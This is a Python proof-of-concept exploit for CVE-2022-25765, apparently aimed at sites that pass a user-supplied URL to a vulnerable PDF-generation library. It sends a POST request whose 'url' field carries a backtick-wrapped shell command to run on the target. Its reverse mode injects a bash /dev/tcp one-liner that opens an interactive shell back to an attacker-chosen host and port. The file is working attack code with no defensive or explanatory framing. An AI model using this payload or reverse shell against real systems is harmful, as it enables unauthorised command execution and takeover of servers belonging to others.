import requests
import argparse

def parse_args():
    parser = argparse.ArgumentParser(
            description='PoC for CVE-2022-25765'
            )
    parser.add_argument('-u','--url',type=str,required=True,help='Site URL')
    parser.add_argument('-c','--command',type=str,help="Command to execute")
    parser.add_argument('-r','--reverse',type=str,help='Reverse shell mode',nargs='+')
    return parser

def execute_payload(command):
    payload = "http://127.0.0.1/?name=#{'%20`"+command+"`'}"
    requests.post(args.url,data={"url":payload})

if __name__ == "__main__":
    
    parser=parse_args()
    args=parser.parse_args()

    if args.reverse != None and len(args.reverse) != 2:
        print("Invalid parameters for --reverse option\n")
        parser.print_help()
    elif args.reverse == None and args.command==None:
        print("Option -r/--reverse or -c/--command is required\n")
        parser.print_help()
    elif args.command != None:
        execute_payload(args.command)
    elif args.reverse != None:
        execute_payload('bash -c "bash -i >& /dev/tcp/'+args.reverse[0]+'/'+args.reverse[1]+'" 0>&1')
